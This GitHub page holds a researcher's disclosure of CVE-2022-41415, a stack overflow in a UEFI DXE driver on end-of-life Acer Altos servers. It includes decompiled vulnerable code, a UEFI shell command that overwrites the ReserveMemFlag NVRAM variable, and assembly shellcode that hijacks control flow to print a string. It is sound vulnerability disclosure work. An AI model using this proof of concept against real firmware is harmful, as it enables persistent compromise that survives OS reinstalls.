
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F10TG%2Fvulnerabilities%2Fblob%2Fmain%2FAcer%2FCVE-2022-41415%2FCVE-2022-41415.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F10TG%2Fvulnerabilities%2Fblob%2Fmain%2FAcer%2FCVE-2022-41415%2FCVE-2022-41415.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=10TG%2Fvulnerabilities)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[10TG](/10TG)
/
**[vulnerabilities](/10TG/vulnerabilities)**
Public

* [Notifications](/login?return_to=%2F10TG%2Fvulnerabilities) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2F10TG%2Fvulnerabilities)
* [Star
   8](/login?return_to=%2F10TG%2Fvulnerabilities)

* [Code](/10TG/vulnerabilities)
* [Issues
  0](/10TG/vulnerabilities/issues)
* [Pull requests
  0](/10TG/vulnerabilities/pulls)
* [Actions](/10TG/vulnerabilities/actions)
* [Projects
  0](/10TG/vulnerabilities/projects)
* [Security](/10TG/vulnerabilities/security)
* [Insights](/10TG/vulnerabilities/pulse)

Additional navigation options

* [Code](/10TG/vulnerabilities)
* [Issues](/10TG/vulnerabilities/issues)
* [Pull requests](/10TG/vulnerabilities/pulls)
* [Actions](/10TG/vulnerabilities/actions)
* [Projects](/10TG/vulnerabilities/projects)
* [Security](/10TG/vulnerabilities/security)
* [Insights](/10TG/vulnerabilities/pulse)

## Files

 main
## Breadcrumbs

1. [vulnerabilities](/10TG/vulnerabilities/tree/main)
2. /[Acer](/10TG/vulnerabilities/tree/main/Acer)
3. /[CVE-2022-41415](/10TG/vulnerabilities/tree/main/Acer/CVE-2022-41415)
/
# CVE-2022-41415.md

 Blame  Blame
## Latest commit

## History

[History](/10TG/vulnerabilities/commits/main/Acer/CVE-2022-41415/CVE-2022-41415.md)84 lines (56 loc) · 3.93 KB main
## Breadcrumbs

1. [vulnerabilities](/10TG/vulnerabilities/tree/main)
2. /[Acer](/10TG/vulnerabilities/tree/main/Acer)
3. /[CVE-2022-41415](/10TG/vulnerabilities/tree/main/Acer/CVE-2022-41415)
/
# CVE-2022-41415.md

Top
## File metadata and controls

* Preview
* Code
* Blame

84 lines (56 loc) · 3.93 KB[Raw](https://github.com/10TG/vulnerabilities/raw/refs/heads/main/Acer/CVE-2022-41415/CVE-2022-41415.md)

There is a stack buffer overflow vulnerability, which could lead to **arbitrary code execution in UEFI DXE driver** in the latest firmware of Acer's Altos servers. And all these affecting models are already end of life. So we decided to disclose the detail.

## Summary

Previously, we did a lot of research in existing works in UEFI security, an example is that Binarly-IO found a lot of vulnerabilities since last year. And there is also a paper in S&P2022 mainly focused on SMM callout vulnerabilities. We believe that the security of UEFI ecosystem remains construction, so we started to do some trivial works.

This vulnerability is similar to our [another one](https://github.com/10TG/vulnerabilities/tree/main/Acer/CVE-2022-30426),which exists due to the incorrect use of the `gRT->GetVariable` service in driver `ReserveMem`.

Affecting models: Altos W2000h-W570h F4, the latest update in 2019.02.13

## Vulnerability Description

Vulnerability exists in function located offset `0x32c` in `ReserveMem`.

The latest firmware can be downloaded here: [link](https://global-download.acer.com/GDFiles/BIOS/BIOS/BIOS_Acer_R01.03.0018_A_A.zip).

```
__int64 __fastcall sub_32C(__int64 a1, __int64 a2)
{
  ... ...
  // v18 is at offset 0x28 the parent funciton's ret address
  __int64 v18; // [rsp+EE0h] [rbp+DE0h]
  DataSize = 1827i64;  // There is a hardcode datasize
  // the omitted code haven't change the "DataSize"
  ... ...
  // DataSize > sizeof(v18), which can cause stack overflow.
  if ( gRT->GetVariable(aReservememflag, &gSetupVariableGuid, 0i64, &DataSize, &v18) || (_BYTE)v19 != (_BYTE)v18 )

  ... ...
  return 0i64;
}
```

The hardcoded `DataSize` parameter is much bigger than the buffer on the stack, and if an attacker modifies the variable's value by either physical or local way, it is possible to trigger a stacke-based buffer overflow and eventually overwrite the return address. We can exploit it by update the value of the NVARM variable `ReserveMemFlag`.

## Vulnerability Analysis

We first wrote a PoC script, which overwrote the return address to "AAAA".

We can simply use a `nsh` script to set the variable's value:

```
setvar ReserveMemFlag -guid ec87d643-eba4-4bb5-a1e5-3f3e36b20da9 -bs -rt -nv =4141414141414141...4141414141414141
```

After running the script, the variable `ReserveMemFlag` has been set to a large string full of "AAAA".

Using gdb to debug, we can see that when the entry function of the driver tries to return, the return address has been overflowed to our payload.

And because the variable is stored in the NVRAM, the next time we try to load the driver, the shellcode will still be triggered thus cause an exception.

[![](/10TG/vulnerabilities/raw/main/Acer/CVE-2022-41415/CVE-2022-41415.assets/CVE-2022-41415-crash.png)](/10TG/vulnerabilities/blob/main/Acer/CVE-2022-41415/CVE-2022-41415.assets/CVE-2022-41415-crash.png)

Since we are able to control the **RIP**, we can further write shellcode in the stack. There isn't ALSR or NX in UEFI DXE phase, so it's quite simple to construct the shellcode to perform a call to `ConOut->OutputString`.

Our shellcode is as following.

```
mov eax, 0x79ee018  ; SystemTable
mov edx, 0x0a
mov r8, [rax+0x40]  ; SystemTable->ConOut
mov rcx, r8
call [r8+0x28]      ; SystemTable->ConOut->SetAttribute
mov eax, 0x79ee018
mov edx, 0x7e2c47a   ; The string need to Output
mov r8, [rax+0x40]
mov rcx, r8
call [r8+0x8]       ; SystemTable->ConOut->OutputString
ret
db "Pwned by 10TG", 0x0 ; UTF-16LE
```

Run the script to set variable and load the driver; we can see that the control flow is hijacked and we successfully print a string.

[![](/10TG/vulnerabilities/raw/main/Acer/CVE-2022-41415/CVE-2022-41415.assets/CVE-2022-41415-poc.gif)](/10TG/vulnerabilities/blob/main/Acer/CVE-2022-41415/CVE-2022-41415.assets/CVE-2022-41415-poc.gif)

In conclusion, an attacker can exploit this vulnerability to **execute arbitrary code in UEFI DXE phase**.

A **malicious code can be installed** which could **survive across an operating system (OS) boot process** and modify NVRAM area in SPI flash storage (to gain persistence on target platform).

## Credit

This vulnerability credited to [river-li](https://github.com/river-li)(Zichuan Li) and [cft789](https://github.com/cft789)(Fangtao Cao) from Wuhan University.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

